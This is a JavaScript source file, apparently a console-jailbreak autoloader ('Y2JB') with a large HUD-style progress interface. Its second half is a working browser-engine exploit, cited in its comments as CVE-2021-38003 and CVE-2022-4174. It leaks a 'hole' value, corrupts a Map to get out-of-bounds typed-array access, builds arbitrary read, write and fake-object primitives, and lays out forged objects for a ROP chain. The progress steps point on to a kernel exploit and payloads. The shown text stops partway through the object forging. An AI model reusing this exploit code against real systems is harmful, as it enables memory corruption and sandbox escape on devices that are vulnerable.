/*
    Copyright (C) 2025 Gezine
    
    This software may be modified and distributed under the terms
    of the MIT license.  See the LICENSE file for details.
*/

const autoloader_version = "@@VERSION@@";



async function load_localscript(src) {
    return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = src;
        script.onload = resolve;
        script.onerror = reject;
        document.head.appendChild(script);
    });
}

function compare_version(a, b) {
    if (!a || !b) return 0;
    const aParts = a.split('.').map(Number);
    const bParts = b.split('.').map(Number);
    const amaj = aParts[0] || 0;
    const amin = aParts[1] || 0;
    const bmaj = bParts[0] || 0;
    const bmin = bParts[1] || 0;
    return amaj === bmaj ? amin - bmin : amaj - bmaj;
}
    
function get_cobalt_buildnumber() {
    const match = navigator.userAgent.match(/Cobalt\/([\w.]+)-/);
    if (!match) return null;
    
    const parts = match[1].split('.');
    return parts[parts.length - 1];
}

(async function() {
    await load_localscript('global.js');
})();

let NETWORK_LOGGING = false;
// Use setlogserver.js payload to change server url at runtime
let LOG_SERVER = 'http://192.168.1.180:8080/log';

async function checkLogServer() {
    try {
        const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Timeout')), 250)
        );
        
        const fetchPromise = fetch(LOG_SERVER, {
            method: 'POST',
            body: 'Log server check from Y2JB'
        });
        
        await Promise.race([fetchPromise, timeoutPromise]);
        
        NETWORK_LOGGING = true;
    } catch (e) {
        NETWORK_LOGGING = false;
    }
}

const baseWidth = 1920;
const baseHeight = 1080;
const scale = window.innerWidth / baseWidth;

let outputElement = null;
// hack for scrolling messages
let maxLines = 56;
const fontSize = Math.floor((baseHeight / maxLines * 0.85) * scale);
const leftPadding = Math.floor((baseWidth * 0.005) * scale);
const topPadding = Math.floor((baseHeight * 0.005) * scale);

// Low-overhead logging: DOM appended synchronously, decoupled from paint.
// (previously: one rAF + setTimeout per message = forced paint on every log call)
let _logFlushScheduled = false;
function _schedule_log_flush() {
    if (_logFlushScheduled) return;
    _logFlushScheduled = true;
    requestAnimationFrame(() => {
        _logFlushScheduled = false;
        if (outputElement) {
            while (outputElement.children.length > maxLines) {
                outputElement.removeChild(outputElement.children[0]);
            }
            outputElement.scrollTop = outputElement.scrollHeight;
        }
    });
}

async function log(msg) {
    let message = String(msg);
    if (!outputElement) {
        outputElement = document.getElementById('output');
        if (!outputElement) {
            outputElement = document.createElement('div');
            outputElement.id = 'output';
            outputElement.style.fontSize = fontSize + 'px';
            document.body.appendChild(outputElement);
        }
        outputElement.style.paddingLeft = leftPadding + 'px';
        outputElement.style.paddingTop = topPadding + 'px'; 
    }
    
    const lines = message.split('\n');
    for (let i = 0; i < lines.length; i++) {
        const lineDiv = document.createElement('div');
        lineDiv.textContent = lines[i] === '' ? '\u00A0' : lines[i];
        outputElement.appendChild(lineDiv);
    }
    
    _schedule_log_flush();
    
    // yield one microtask so callers keep their async flow without forcing a paint
    await Promise.resolve();
        
    if (NETWORK_LOGGING) {
        try {
            await fetch(LOG_SERVER, {
                method: 'POST',
                body: message,
            });
        } catch (e) { }
    }
}

function toHex(num) {
    return '0x' + BigInt(num).toString(16).padStart(16, '0');
}

function trigger() {
    let v1;
    function f0(v4) {
        v4(() => { }, v5 => {
            v1 = v5.errors;
        });
    }
    f0.resolve = function (v6) {
        return v6;
    };
    let v3 = {
        then(v7, v8) {
            v8();
        }
    };
    Promise.any.call(f0, [v3]);
    return v1[1];
}

(async function() {
    const original_log = window.log || log;
    window.log = async function(msg) {
        if (typeof msg === 'string' && (msg.includes("[ERROR]") || msg.includes("[-]"))) {
            if (typeof window.hideUI === 'function') window.hideUI();
        }
        if (typeof original_log === 'function') {
            return await original_log(msg);
        }
    };

    // ------------------------------------------------------------------
    // HUD OPS CONSOLE UI (L92 edition)
    // Sharp military-HUD look, mint/amber accents, zero border-radius.
    // Public API preserved: autoloader_ui / updateProgress / uiLog / hideUI
    // ------------------------------------------------------------------
    window.inject_ui_style = function() {
        if (document.getElementById("hud_style")) return;
        const style = document.createElement("style");
        style.id = "hud_style";
        style.textContent = [
            "@keyframes hudPulse { 0%,100% { opacity:1; box-shadow:0 0 0 0 rgba(0,255,163,.55);} 50% { opacity:.55; box-shadow:0 0 0 12px rgba(0,255,163,0);} }",
            "@keyframes hudTicker { 0% { transform: translateX(0);} 100% { transform: translateX(-50%);} }",
            "@keyframes hudScan { 0% { top:-16%;} 100% { top:116%;} }",
            "@keyframes hudShimmer { 0% { background-position: 0% 0;} 100% { background-position: 200% 0;} }",
            "#hud_bg { position:absolute; top:0; left:0; width:1920px; height:1080px; background-image:url('background.png'); background-size:cover; background-position:center; z-index:0; }",
            "#hud_duo { position:absolute; top:0; left:0; width:1920px; height:1080px; background:linear-gradient(115deg, rgba(3,6,10,.94) 0%, rgba(3,6,10,.55) 55%, rgba(3,6,10,.90) 100%); z-index:1; }",
            "#hud_grid { position:absolute; top:0; left:0; width:1920px; height:1080px; background-image:linear-gradient(rgba(0,255,163,.045) 1px, rgba(0,0,0,0) 1px), linear-gradient(90deg, rgba(0,255,163,.045) 1px, rgba(0,0,0,0) 1px); background-size:64px 64px; z-index:1; }",
            "#hud_scan { position:absolute; left:0; width:100%; height:12%; background:linear-gradient(180deg, rgba(0,255,163,0) 0%, rgba(0,255,163,.05) 50%, rgba(0,255,163,0) 100%); z-index:2; animation:hudScan 11s linear infinite; }",
            "#hud_vign { position:absolute; top:0; left:0; width:1920px; height:1080px; background:radial-gradient(ellipse at 50% 42%, rgba(0,0,0,0) 30%, rgba(3,6,10,.55) 100%); z-index:2; }"
        ].join("\n");
        document.head.appendChild(style);
    };

    window.autoloader_ui = function() {
        if (document.getElementById("autoloader_ui")) {
            const existing_ui = document.getElementById("autoloader_ui");
            existing_ui.parentNode.removeChild(existing_ui);
        }
        window.inject_ui_style();

        const baseWidth = 1920;
        const baseHeight = 1080;
        const scale = window.innerWidth / baseWidth;

        const ACC = "#00ffa3";      // mint
        const AMB = "#ffb300";      // amber
        const INK = "rgba(6,12,16,.90)";

        const autoloader_ui = document.createElement("div");
        autoloader_ui.id = "autoloader_ui";
        autoloader_ui.style.position = "fixed";
        autoloader_ui.style.top = "0px";
        autoloader_ui.style.left = "0px";
        autoloader_ui.style.width = baseWidth + "px";
        autoloader_ui.style.height = baseHeight + "px";
        autoloader_ui.style.transform = "scale(" + scale + ")";
        autoloader_ui.style.transformOrigin = "top left";
        autoloader_ui.style.zIndex = "9999";
        autoloader_ui.style.overflow = "hidden";
        autoloader_ui.style.backgroundColor = "#04060a";
        autoloader_ui.style.fontFamily = "Arial, sans-serif";

        // Scenic + HUD layers
        const bg = document.createElement("div"); bg.id = "hud_bg"; autoloader_ui.appendChild(bg);
        const duo = document.createElement("div"); duo.id = "hud_duo"; autoloader_ui.appendChild(duo);
        const grid = document.createElement("div"); grid.id = "hud_grid"; autoloader_ui.appendChild(grid);
        const vign = document.createElement("div"); vign.id = "hud_vign"; autoloader_ui.appendChild(vign);
        const scan = document.createElement("div"); scan.id = "hud_scan"; autoloader_ui.appendChild(scan);

        // Frame brackets
        const brackets = [
            [52, 52, "top", "left"],
            [1786, 52, "top", "right"],
            [52, 992, "bottom", "left"],
            [1786, 992, "bottom", "right"]
        ];
        for (let i = 0; i < 4; i++) {
            const b = document.createElement("div");
            b.style.position = "absolute";
            b.style.top = brackets[i][1] + "px";
            b.style.left = brackets[i][0] + "px";
            b.style.width = "62px";
            b.style.height = "62px";
            b.style.zIndex = "4";
            b.style.borderTop = "3px solid rgba(0,0,0,0)";
            b.style.borderLeft = "3px solid rgba(0,0,0,0)";
            b.style.borderBottom = "3px solid rgba(0,0,0,0)";
            b.style.borderRight = "3px solid rgba(0,0,0,0)";
            b.style["border-" + brackets[i][2]] = "3px solid " + ACC;
            b.style["border-" + brackets[i][3]] = "3px solid " + ACC;
            b.style.opacity = "0.85";
            autoloader_ui.appendChild(b);
        }

        // ---- Left: brand block
        const logo = document.createElement("div");
        logo.style.position = "absolute";
        logo.style.top = "72px";
        logo.style.left = "80px";
        logo.style.width = "88px";
        logo.style.height = "88px";
        logo.style.backgroundImage = "url('icon0.png')";
        logo.style.backgroundSize = "cover";
        logo.style.backgroundPosition = "center";
        logo.style.border = "3px solid " + ACC;
        logo.style.boxShadow = "0 0 26px rgba(0,255,163,.35)";
        logo.style.zIndex = "3";
        autoloader_ui.appendChild(logo);

        const brand = document.createElement("div");
        brand.style.position = "absolute";
        brand.style.top = "64px";
        brand.style.left = "196px";
        brand.style.zIndex = "3";
        const brandName = document.createElement("div");
        brandName.textContent = "Y2JB";
        brandName.style.fontSize = "84px";
        brandName.style.fontWeight = "bold";
        brandName.style.color = "#f2fff9";
        brandName.style.letterSpacing = "4px";
        brandName.style.lineHeight = "84px";
        brand.appendChild(brandName);
        const brandSub = document.createElement("div");
        brandSub.textContent = "AUTOLOADER \u2022 OPS CONSOLE";
        brandSub.style.fontSize = "19px";
        brandSub.style.color = AMB;
        brandSub.style.letterSpacing = "7px";
        brandSub.style.marginTop = "6px";
        brand.appendChild(brandSub);
        autoloader_ui.appendChild(brand);

        // ---- Left: runtime log terminal
        const logPanel = document.createElement("div");
        logPanel.style.position = "absolute";
        logPanel.style.top = "280px";
        logPanel.style.left = "80px";
        logPanel.style.width = "800px";
        logPanel.style.height = "620px";
        logPanel.style.border = "1px solid rgba(0,255,163,.4)";
        logPanel.style.backgroundColor = INK;
        logPanel.style.boxShadow = "0 0 30px rgba(0,0,0,.6)";
        logPanel.style.zIndex = "3";
        autoloader_ui.appendChild(logPanel);

        const logHead = document.createElement("div");
        logHead.textContent = "RUNTIME LOG";
        logHead.style.height = "46px";
        logHead.style.lineHeight = "44px";
        logHead.style.padding = "0 18px";
        logHead.style.fontSize = "20px";
        logHead.style.fontWeight = "bold";
        logHead.style.letterSpacing = "5px";
        logHead.style.color = ACC;
        logHead.style.borderBottom = "1px solid rgba(0,255,163,.35)";
        logHead.style.backgroundColor = "rgba(0,255,163,.07)";
        logHead.style.fontFamily = "monospace";
        logPanel.appendChild(logHead);

        const logWrap = document.createElement("div");
        logWrap.style.position = "relative";
        logWrap.style.height = "574px";
        logWrap.style.overflow = "hidden";
        logWrap.style.fontFamily = "monospace";
        logWrap.style.fontSize = "22px";
        logWrap.style.lineHeight = "31px";
        logWrap.style.color = "#b9c9c3";
        logWrap.id = "logWrapper";
        logWrap.style.padding = "0 18px";
        logPanel.appendChild(logWrap);

        const logContainer = document.createElement("div");
        logContainer.id = "logContainer";
        logContainer.style.position = "absolute";
        logContainer.style.bottom = "0";
        logContainer.style.left = "18px";
        logContainer.style.right = "18px";
        logWrap.appendChild(logContainer);

        // ---- Right: mission status panel
        const msn = document.createElement("div");
        msn.style.position = "absolute";
        msn.style.top = "280px";
        msn.style.left = "1140px";
        msn.style.width = "700px";
        msn.style.height = "620px";
        msn.style.border = "1px solid rgba(0,255,163,.4)";
        msn.style.backgroundColor = INK;
        msn.style.zIndex = "3";
        autoloader_ui.appendChild(msn);

        const msnHead = document.createElement("div");
        msnHead.textContent = "MISSION STATUS";
        msnHead.style.height = "46px";
        msnHead.style.lineHeight = "44px";
        msnHead.style.padding = "0 18px";
        msnHead.style.fontSize = "20px";
        msnHead.style.fontWeight = "bold";
        msnHead.style.letterSpacing = "5px";
        msnHead.style.color = ACC;
        msnHead.style.borderBottom = "1px solid rgba(0,255,163,.35)";
        msnHead.style.backgroundColor = "rgba(0,255,163,.07)";
        msnHead.style.fontFamily = "monospace";
        msn.appendChild(msnHead);

        const statusLine = document.createElement("div");
        statusLine.id = "hud_status";
        statusLine.textContent = "INITIALISING...";
        statusLine.style.padding = "14px 18px 10px 18px";
        statusLine.style.fontSize = "22px";
        statusLine.style.fontWeight = "bold";
        statusLine.style.letterSpacing = "1px";
        statusLine.style.color = "#f2fff9";
        statusLine.style.fontFamily = "monospace";
        statusLine.style.whiteSpace = "nowrap";
        statusLine.style.overflow = "hidden";
        msn.appendChild(statusLine);

        // Steps
        const stepNames = ["BOOT", "EXPLOIT", "KERNEL", "UPDATE", "PAYLOAD"];
        const stepsBox = document.createElement("div");
        stepsBox.style.margin = "6px 18px 0 18px";
        stepsBox.style.borderTop = "1px solid rgba(255,255,255,.09)";
        msn.appendChild(stepsBox);
        for (let i = 0; i < stepNames.length; i++) {
            const row = document.createElement("div");
            row.style.position = "relative";
            row.style.height = "62px";
            row.style.borderBottom = "1px solid rgba(255,255,255,.09)";

            const marker = document.createElement("div");
            marker.style.position = "absolute";
            marker.style.left = "0px";
            marker.style.top = "16px";
            marker.style.width = "30px";
            marker.style.height = "30px";
            marker.style.border = "2px solid rgba(140,160,152,.85)";
            marker.style.backgroundColor = "rgba(0,0,0,0)";
            row.appendChild(marker);

            const nm = document.createElement("div");
            nm.textContent = "0" + (i + 1) + " / " + stepNames[i];
            nm.style.position = "absolute";
            nm.style.left = "48px";
            nm.style.top = "18px";
            nm.style.fontSize = "24px";
            nm.style.color = "#8ea39a";
            nm.style.letterSpacing = "3px";
            row.appendChild(nm);

            const st = document.createElement("div");
            st.textContent = "IDLE";
            st.id = "hud_step_" + i;
            st.style.position = "absolute";
            st.style.right = "0px";
            st.style.top = "21px";
            st.style.fontSize = "18px";
            st.style.letterSpacing = "3px";
            st.style.color = "rgba(140,160,152,.7)";
            st.style.fontFamily = "monospace";
            row.appendChild(st);

            stepsBox.appendChild(row);
        }

        // Big percentage + segmented bar
        const pctBox = document.createElement("div");
        pctBox.style.position = "absolute";
        pctBox.style.left = "18px";
        pctBox.style.right = "18px";
        pctBox.style.bottom = "24px";
        msn.appendChild(pctBox);

        const pctNum = document.createElement("div");
        pctNum.id = "hud_pct";
        pctNum.textContent = "00%";
        pctNum.style.fontSize = "104px";
        pctNum.style.fontWeight = "bold";
        pctNum.style.color = ACC;
        pctNum.style.letterSpacing = "6px";
        pctNum.style.lineHeight = "104px";
        pctNum.style.textShadow = "0 0 22px rgba(0,255,163,.45)";
        pctNum.style.fontFamily = "monospace";
        pctBox.appendChild(pctNum);

        const barTrack = document.createElement("div");
        barTrack.style.height = "22px";
        barTrack.style.border = "1px solid rgba(0,255,163,.45)";
        barTrack.style.position = "relative";
        barTrack.style.overflow = "hidden";
        barTrack.style.marginTop = "16px";
        barTrack.style.backgroundColor = "rgba(0,0,0,.45)";
        pctBox.appendChild(barTrack);

        const barFill = document.createElement("div");
        barFill.id = "progressBar";
        barFill.style.width = "100%";
        barFill.style.height = "100%";
        barFill.style.background = "linear-gradient(90deg, #00ffa3, #8cffd9, #ffb300, #00ffa3)";
        barFill.style.backgroundSize = "200% 100%";
        barFill.style.transformOrigin = "left";
        barFill.style.transform = "scaleX(0)";
        barFill.style.opacity = "0.95";
        barTrack.appendChild(barFill);

        const segs = document.createElement("div");
        segs.style.position = "absolute";
        segs.style.top = "0";
        segs.style.left = "0";
        segs.style.width = "100%";
        segs.style.height = "100%";
        segs.style.backgroundImage = "linear-gradient(90deg, rgba(4,6,10,1) 0, rgba(4,6,10,1) 6px, rgba(0,0,0,0) 6px, rgba(0,0,0,0) 34px)";
        segs.style.backgroundSize = "34px 100%";
        barTrack.appendChild(segs);

        const barLabel = document.createElement("div");
        barLabel.id = "progressLabel";
        barLabel.textContent = "STANDBY";
        barLabel.style.position = "absolute";
        barLabel.style.top = "0";
        barLabel.style.left = "0";
        barLabel.style.width = "100%";
        barLabel.style.textAlign = "center";
        barLabel.style.lineHeight = "22px";
        barLabel.style.fontSize = "14px";
        barLabel.style.fontWeight = "bold";
        barLabel.style.letterSpacing = "4px";
        barLabel.style.color = "#eafff5";
        barTrack.appendChild(barLabel);

        // ---- Footer ticker
        const ticker = document.createElement("div");
        ticker.style.position = "absolute";
        ticker.style.left = "0px";
        ticker.style.right = "0px";
        ticker.style.bottom = "0px";
        ticker.style.height = "52px";
        ticker.style.borderTop = "1px solid rgba(0,255,163,.3)";
        ticker.style.backgroundColor = "rgba(3,6,10,.8)";
        ticker.style.zIndex = "3";
        ticker.style.overflow = "hidden";
        autoloader_ui.appendChild(ticker);

        const tickerInner = document.createElement("div");
        const base = "Y2JB AUTOLOADER L92 \u2022 BOOT > EXPLOIT > KERNEL > UPDATE > PAYLOAD \u2022 ";
        tickerInner.textContent = base + base + base + base;
        tickerInner.style.position = "absolute";
        tickerInner.style.whiteSpace = "nowrap";
        tickerInner.style.lineHeight = "52px";
        tickerInner.style.fontSize = "20px";
        tickerInner.style.fontFamily = "monospace";
        tickerInner.style.letterSpacing = "2px";
        tickerInner.style.color = "rgba(0,255,163,.55)";
        tickerInner.style.animation = "hudTicker 36s linear infinite";
        ticker.appendChild(tickerInner);

        document.body.appendChild(autoloader_ui);
    };

    window.hud_paint_steps = function(states) {
        for (let i = 0; i < 5; i++) {
            const stEl = document.getElementById("hud_step_" + i);
            if (!stEl) continue;
            const row = stEl.parentNode;
            const marker = row.firstChild;
            if (!marker || !marker.style) continue;

            const state = states[i] || "idle";
            if (state === "done") {
                stEl.textContent = "COMPLETE";
                stEl.style.color = "#00ffa3";
                marker.style.border = "2px solid #00ffa3";
                marker.style.backgroundColor = "#00ffa3";
                marker.style.boxShadow = "none";
                marker.style.animation = "none";
            } else if (state === "run") {
                stEl.textContent = "RUNNING";
                stEl.style.color = "#ffb300";
                marker.style.border = "2px solid #ffb300";
                marker.style.backgroundColor = "rgba(0,0,0,0)";
                marker.style.boxShadow = "0 0 12px rgba(255,179,0,.55)";
                marker.style.animation = "hudPulse 1.2s ease-in-out infinite";
            } else {
                stEl.textContent = "IDLE";
                stEl.style.color = "rgba(140,160,152,.7)";
                marker.style.border = "2px solid rgba(140,160,152,.85)";
                marker.style.backgroundColor = "rgba(0,0,0,0)";
                marker.style.boxShadow = "none";
                marker.style.animation = "none";
            }
        }
    };

    window.updateProgress = function(percent, message="Loading...") {
        const bar = document.getElementById("progressBar");
        if (bar) {
            bar.style.transform = "scaleX(" + percent / 100 + ")";
        }
        const label = document.getElementById("progressLabel");
        if (label) {
            label.textContent = String(message).toUpperCase();
        }
        const pct = document.getElementById("hud_pct");
        if (pct) {
            pct.textContent = (percent < 10 ? "0" : "") + percent + "%";
            pct.style.color = percent >= 100 ? "#00ffa3" : "#ffb300";
        }
        const status = document.getElementById("hud_status");
        if (status) {
            status.textContent = String(message).toUpperCase();
        }

        const m = String(message || "").toLowerCase();
        let states = null;
        if (m.indexOf("userland") !== -1) {
            states = ["done", "run", "idle", "idle", "idle"];
        } else if (m.indexOf("running kernel exploit") !== -1) {
            states = ["done", "done", "run", "idle", "idle"];
        } else if (m.indexOf("kernel exploit finished") !== -1 || m.indexOf("updating y2jb") !== -1) {
            states = ["done", "done", "done", "run", "idle"];
        } else if (m.indexOf("syncing icon") !== -1) {
            states = ["done", "done", "done", "done", "idle"];
        } else if (m.indexOf("sending payloads") !== -1) {
            states = ["done", "done", "done", "done", "run"];
        } else if (m.indexOf("finish") !== -1 || m.indexOf("complete") !== -1) {
            states = ["done", "done", "done", "done", "done"];
        }
        if (states) {
            window.hud_paint_steps(states);
        }
        window.uiLog(message, "warning");
    };

    window.uiLog = function(message, type="info") {
        if (typeof message === "string" && (message.includes("[ERROR]") || message.includes("[-]"))) {
            if (typeof window.hideUI === "function") window.hideUI();
        }
        const logContainer = document.getElementById("logContainer");
        if (logContainer) {
            const logEntry = document.createElement("div");
            if (type === "error") {
                logEntry.style.color = "#ff5470";
                logEntry.style.fontWeight = "bold";
            } else if (type === "success") {
                logEntry.style.color = "#00ffa3";
            } else if (type === "warning") {
                logEntry.style.color = "#ffb300";
            } else {
                logEntry.style.color = "#b9c9c3";
            }
            logEntry.style.whiteSpace = "nowrap";
            logEntry.textContent = "\u203A " + message;
            logContainer.appendChild(logEntry);
            while (logContainer.childElementCount > 30) {
                logContainer.removeChild(logContainer.firstChild);
            }
            const logWrap = document.getElementById("logWrapper");
            if (logWrap) {
                logWrap.scrollTop = logWrap.scrollHeight;
            }
        }
    };

    window.hideUI = function() {
        if (document.getElementById("autoloader_ui")) {
            const existing_ui = document.getElementById("autoloader_ui");
            existing_ui.parentNode.removeChild(existing_ui);
        }
    };


    try {
        if (typeof window.autoloader_ui === 'function') {
            window.autoloader_ui();
            window.uiLog("Y2JB Autoloader " + autoloader_version + " by PLK", "success");
            window.updateProgress(0, "Running userland exploit...");

        }
        await log('Starting Exploit');
        
        await gc();
        await gc();
        await gc();
        await gc();
        
        // CVE-2021-38003
        // CVE-2022-4174 faster hole leak
        // https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
        let hole = trigger();
        if (hole === undefined) {
            throw new Error("Failed to trigger the hole (undefined)");
        }

        let obj_arr_offset = -1;
        const MAX_PRIMITIVE_ATTEMPTS = 3;

        for (let attempt = 1; attempt <= MAX_PRIMITIVE_ATTEMPTS && obj_arr_offset === -1; attempt++) {
            if (attempt > 1) {
                await log("Primitive acquisition failed, retrying (" + attempt + "/" + MAX_PRIMITIVE_ATTEMPTS + ")...");
                // release references so GC can fully reclaim the failed heap spray
                map1 = null;
                oob_arr = null;
                victim_arr = null;
                obj_arr = null;
                await gc();
                await gc();
                await gc();
            }

            for (let i = 0; i < 0x10; i++) {
                map1 = new Map();
                map1.set(1, 1);
                map1.set(hole, 1);
                map1.delete(hole);
                map1.delete(hole);
                map1.delete(1);
                oob_arr = new BigUint64Array([0x4141414141414141n]);
            }

            victim_arr = new BigUint64Array([0x4343434343434343n, 0x4343434343434343n]);
            obj_arr = [{}, {}];

            map1.set(0x1e, -1);
            gc();
            map1.set(0x0, 0x1);

            //oob_arr[31] : 0x2 -- victim_arr length
            //oob_arr[32] : 0xf -- victim_arr ExternalPointer_t 
            //oob_arr[33] : 0x27e8412d1 -- victm_arr base_pointer

            await log ("oob_arr length : " + toHex(oob_arr.length));

            const oob_arr_before = [];
            for (let i = 0; i < 100; i++) {
                oob_arr_before[i] = oob_arr[i];
            }

            obj_arr[0] = 0x1n;

            for (let i = 0; i < 100; i++) {
                if (oob_arr[i] !== oob_arr_before[i]) {
                    obj_arr_offset = i;
                    break;
                }
            }
        }

        if (obj_arr_offset === -1) {
            throw new Error("Failed to get unstable primitive after " + MAX_PRIMITIVE_ATTEMPTS + " attempts");
        }

        //await log('obj_arr_offset : ' + obj_arr_offset);

        await log("Unstable primitive achieved");
        
        function addrof_unstable(obj) {
            const obj_arr_org_value = oob_arr[obj_arr_offset];
            obj_arr[0] = obj;
            const addr = oob_arr[obj_arr_offset] - 1n;
            oob_arr[obj_arr_offset] = obj_arr_org_value;
            return addr;
        }
        
        function read64_unstable(addr) {
            const victim_arr_org_base = oob_arr[33];
            oob_arr[33] = addr - 0xfn;
            const value = victim_arr[0];
            oob_arr[33] = victim_arr_org_base;
            return value;
        }
        
        function write64_unstable(addr, value) {
            const victim_arr_org_base = oob_arr[33];
            oob_arr[33] = addr - 0xfn;
            victim_arr[0] = value;
            oob_arr[33] = victim_arr_org_base;
        }
        
        function create_fakeobj_unstable(addr) {
            const obj_arr_org_value = oob_arr[obj_arr_offset];
            oob_arr[obj_arr_offset] = addr + 1n;
            const fake_obj = obj_arr[0];
            oob_arr[obj_arr_offset] = obj_arr_org_value;
            return fake_obj;
        }                
        
        // Allocate Large Object Space with proper page metadata
        // Create object array first to initialize page structures
        const stable_array = new Array(0x10000);
        for (let i = 0; i < stable_array.length; i++) {
            stable_array[i] = {};
        }
                        
        // Get FixedDoubleArray map from a template
        const double_template = new Array(0x10);
        double_template.fill(3.14);
        const double_template_addr = addrof_unstable(double_template);
        const double_elements_addr = read64_unstable(double_template_addr + 0x10n) - 1n;
        const fixed_double_array_map = read64_unstable(double_elements_addr + 0x00n);
        
        // Get stable_array addresses
        const stable_array_addr = addrof_unstable(stable_array);
        const stable_elements_addr = read64_unstable(stable_array_addr + 0x10n) - 1n;
        
        // Transform elements to FixedDoubleArray
        // This makes GC happy later
        write64_unstable(stable_elements_addr + 0x00n, fixed_double_array_map);
        
        // Get templates for large external storage arrays
        const template_biguint = new BigUint64Array(64);
        const template_biguint_addr = addrof_unstable(template_biguint);
        const template_biguint_elements = read64_unstable(template_biguint_addr + 0x10n) - 1n;
        
        const biguint_map = read64_unstable(template_biguint_addr + 0x00n);
        const biguint_props = read64_unstable(template_biguint_addr + 0x08n);
        const biguint_elem_map = read64_unstable(template_biguint_elements + 0x00n);
        const biguint_elem_len = read64_unstable(template_biguint_elements + 0x08n);
        
        // Get template for small inline storage arrays
        const template_small = new BigUint64Array(8);
        const template_small_addr = addrof_unstable(template_small);
        const template_small_buffer_addr = read64_unstable(template_small_addr + 0x18n) - 1n;
        const template_small_elements_addr = read64_unstable(template_small_addr + 0x10n) - 1n;
        
        const small_map = read64_unstable(template_small_addr + 0x00n);
        const small_props = read64_unstable(template_small_addr + 0x08n);
        const small_elem_map = read64_unstable(template_small_elements_addr + 0x00n);
        const small_elem_length_field = read64_unstable(template_small_elements_addr + 0x08n);
        
        const small_buffer_map = read64_unstable(template_small_buffer_addr + 0x00n);
        const small_buffer_props = read64_unstable(template_small_buffer_addr + 0x08n);
        const small_buffer_elements = read64_unstable(template_small_buffer_addr + 0x10n);
        const small_buffer_bit_field = read64_unstable(template_small_buffer_addr + 0x30n);
        
        // Get template for ArrayBuffer
        const template_buffer = new ArrayBuffer(1024);
        const template_buffer_addr = addrof_unstable(template_buffer);
        const template_buffer_elements = read64_unstable(template_buffer_addr + 0x10n) - 1n;
        
        const buffer_map = read64_unstable(template_buffer_addr + 0x00n);
        const buffer_props = read64_unstable(template_buffer_addr + 0x08n);
        const buffer_elem_map = read64_unstable(template_buffer_elements + 0x00n);
        const buffer_elem_len = read64_unstable(template_buffer_elements + 0x08n);
        
        // Get template for Array object
        const template_array = [{}, {}];
        const template_array_addr = addrof_unstable(template_array);
        const template_array_elements_addr = read64_unstable(template_array_addr + 0x10n) - 1n;
        
        const array_map = read64_unstable(template_array_addr + 0x00n);
        const array_props = read64_unstable(template_array_addr + 0x08n);
        const array_elem_map = read64_unstable(template_array_elements_addr + 0x00n);
        
        // Get template for double object
        const heap_number = 1.1;
        const heap_number_addr = addrof_unstable(heap_number);
        const heap_number_map = read64_unstable(heap_number_addr);
        
        const base = stable_elements_addr + 0x2000n;
        
        // Main data region that fake_rw will read/write
        const fake_rw_data = base + 0x0000n;
        
        // Inside fake_rw_data: fake Array's elements (at the beginning)
        const fake_array_elements_data = fake_rw_data + 0x0000n;
        // Structure: +0x00: map, +0x08: length, +0x10: slot[0], +0x18: slot[1], ...
        
        const fake_arr2_obj = base + 0x0100n;
        const fake_arr2_elements = base + 0x0150n;
        const fake_rw2_data = base + 0x0200n;
        
        // +0x00: ArrayBuffer (0x38 bytes)
        // +0x48: Elements FixedArray (0x10 bytes header)
        // +0x58: Data (64 bytes for 8 uint64s)
        // +0x98: BigUint64Array object (0x48 bytes)
        
        const fake_bc_base = base + 0x0400n;
        const fake_bc_buffer = fake_bc_base + 0x00n;
        const fake_bc_elements = fake_bc_base + 0x48n;
        const fake_bc_data = fake_bc_base + 0x58n;
        const fake_bc_obj = fake_bc_base + 0x98n;
        
        const fake_frame_base = base + 0x0600n;
        const fake_frame_buffer = fake_frame_base + 0x00n;
        const fake_frame_elements = fake_frame_base + 0x48n;
        const fake_frame_data = fake_frame_base + 0x58n;
        const fake_frame_obj = fake_frame_base + 0x98n;
        
        const fake_buffer_rw2_obj = base + 0x0800n;
        const fake_buffer_rw2_elements = base + 0x0850n;
        
        // Objects outside fake_rw accessible range
        const fake_buffer_rw_obj = base + 0x1000n;
        const fake_buffer_rw_elements = base + 0x1050n;
        const fake_array_obj = base + 0x1100n;
        const fake_rw_obj = base + 0x1200n;
        const fake_rw_elements = base + 0x1250n;
        
        // ROP chain with external storage
        const fake_rop_chain_data = base + 0x2000n;
        const fake_rop_chain_buffer_obj = base + 0x3000n;
        const fake_rop_chain_buffer_elements = base + 0x3050n;
        const fake_rop_chain_obj = base + 0x3100n;
        const fake_rop_chain_elements = base + 0x3150n;
        
        // return_value_buf with inline storage
        const fake_return_value_elements = base + 0x4000n;
        const fake_return_value_buffer_obj = base + 0x4100n;
        const fake_return_value_buffer_elements = base + 0x4150n;
        const fake_return_value_obj = base + 0x4200n;
        
        // Create fake Array elements inside fake_rw_data region
        // FixedArray: map + length + data slots
        write64_unstable(fake_array_elements_data + 0x00n, array_elem_map);
        write64_unstable(fake_array_elements_data + 0x08n, 0x0000001000000000n);  // length = 16 slots (Smi)
        
        for (let i = 0n; i < 16n; i++) {
            write64_unstable(fake_array_elements_data + 0x10n + i * 8n, 0n);
        }
        
        // Create fake Array object pointing to elements inside fake_rw_data
        write64_unstable(fake_array_obj + 0x00n, array_map);
        write64_unstable(fake_array_obj + 0x08n, array_props);
        write64_unstable(fake_array_obj + 0x10n, fake_array_elements_data + 1n);  // elements (tagged)
        write64_unstable(fake_array_obj + 0x18n, 0x0000001000000000n);  // length = 16 (Smi)
        
        // Create fake ArrayBuffer #1 elements
        write64_unstable(fake_buffer_rw_elements + 0x00n, buffer_elem_map);
        write64_unstable(fake_buffer_rw_elements + 0x08n, buffer_elem_len);
        
        // Create fake ArrayBuffer #1 (buffer_rw)
        write64_unstable(fake_buffer_rw_obj + 0x00n, buffer_map);
        write64_unstable(fake_buffer_rw_obj + 0x08n, buffer_props);
        write64_unstable(fake_buffer_rw_obj + 0x10n, fake_buffer_rw_elements + 1n);
        write64_unstable(fake_buffer_rw_obj + 0x18n, 0x1000n);  // byte_length
        write64_unstable(fake_buffer_rw_obj + 0x20n, fake_rw_data);  // backing_store
        write64_unstable(fake_buffer_rw_obj + 0x28n, 0n);  // extension
        write64_unstable(fake_buffer_rw_obj + 0x30n, 0n);  // bit_field
        
        // Create fake ArrayBuffer #2 elements
        write64_unstable(fake_buffer_rw2_elements + 0x00n, buffer_elem_map);
